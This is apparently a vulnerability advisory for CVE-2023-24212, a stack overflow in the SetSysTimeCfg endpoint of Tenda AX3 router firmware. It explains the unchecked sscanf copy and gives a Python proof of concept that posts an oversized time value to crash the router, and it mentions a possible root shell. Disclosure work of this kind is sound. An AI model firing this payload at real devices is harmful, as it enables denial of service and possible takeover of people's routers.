# Tenda AX3 V16.03.12.11 Stack overflow vulnerability

## CVE-2023-24212

## Firmware information

- Manufacturer's address：https://www.tenda.com.cn/

- Firmware download address ： https://www.tenda.com.cn/download/detail-3476.html

## Affected version

![](https://github.com/w0x68y/cve-lists/blob/main/Tenda/vuln/imgs/1.png)

## Vulnerability details

![](https://github.com/w0x68y/cve-lists/blob/main/Tenda/vuln/imgs/2.png)

![](https://github.com/w0x68y/cve-lists/blob/main/Tenda/vuln/imgs/3.png)

In /goform/SetSysTimeCfg, First, the user will pass in the timeType. When the timeType is manual, the user can pass in time, and then use sscanf to assign the value of time to v14~v27. It is worth noting that there is no size check, which leads to a stack overflow vulnerability.

## Poc

```python
import requests

url = "http://192.168.0.1/goform/SetSysTimeCfg"

timeType = "manual"

time = "2023-01-15 "
time += "a" * 0x2000

r = requests.post(url, data={'timeType': timeType, 'time': time})
print(r.content)
```

Then you can see the router crash, and finally you can write exp to get rootshell
